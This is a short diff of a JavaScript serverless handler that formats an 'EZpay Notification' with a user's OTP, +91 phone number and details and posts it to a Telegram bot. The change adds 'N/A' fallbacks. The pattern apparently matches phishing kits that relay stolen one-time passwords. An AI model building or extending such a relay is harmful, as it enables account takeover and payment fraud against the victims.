@@ -26,7 +26,7 @@ export default async function handler(req, res) {
             + `🔢 <b>OTP:</b> ${otp || 'N/A'}\n`
             + `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
     } else {
-        message = `🔔 <b>EZpay Notification</b>\n\n📱 <b>Phone:</b> +91 ${phone}\nℹ️ <b>Details:</b> ${details}`;
+        message = `🔔 <b>EZpay Notification</b>\n\n📱 <b>Phone:</b> +91 ${phone || 'N/A'}\nℹ️ <b>Details:</b> ${details || 'N/A'}`;
     }
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
